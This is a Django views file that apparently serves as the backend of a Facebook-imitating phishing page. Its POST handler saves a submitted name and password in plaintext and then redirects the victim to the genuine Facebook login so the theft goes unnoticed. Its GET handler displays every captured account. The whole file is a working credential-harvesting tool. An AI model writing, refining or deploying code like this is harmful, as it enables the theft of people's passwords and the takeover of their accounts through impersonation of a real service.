from django.shortcuts import render, redirect
from .models import Account


# Create your views here.
def home_page(request):
    if request.method == "GET":
        accounts = Account.objects.all()
        context = {
            "all_accounts": accounts
        }
        return render(request, "index.html", context)
    elif request.method == "POST":
        name = request.POST["name"]
        password = request.POST["password"]

        Account.objects.create(name=name, password=password)

        return redirect("https://www.facebook.com/login")
